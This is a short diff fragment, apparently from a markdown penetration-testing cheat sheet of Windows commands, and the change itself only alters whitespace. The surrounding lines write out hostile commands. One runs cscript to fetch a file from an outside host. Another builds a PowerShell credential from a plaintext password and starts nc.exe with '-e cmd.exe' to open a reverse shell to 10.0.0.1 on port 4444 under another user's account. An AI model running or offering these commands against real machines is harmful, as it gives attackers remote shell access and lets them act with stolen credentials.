@@ -64,7 +64,7 @@ cscript /nologo fu.js http://ip/bullshit > uploaded_file
 $secpasswd = ConvertTo-SecureString "passwordhere" -AsPlainText -Force
 $mycreds = New-Object System.Management.Automation.PSCredential ("usernamehere", $secpasswd)
 $computer = "Hostnamehere"
-[System.Diagnostics.Process]::Start("c:\temp\nc.exe","10.0.0.1 4444 -e cmd.exe",$mycreds.Username, $mycreds.Password, $computer)
+ [System.Diagnostics.Process]::Start("c:\temp\nc.exe","10.0.0.1 4444 -e cmd.exe",$mycreds.Username, $mycreds.Password, $computer)
 ```
 - execute as
 ```
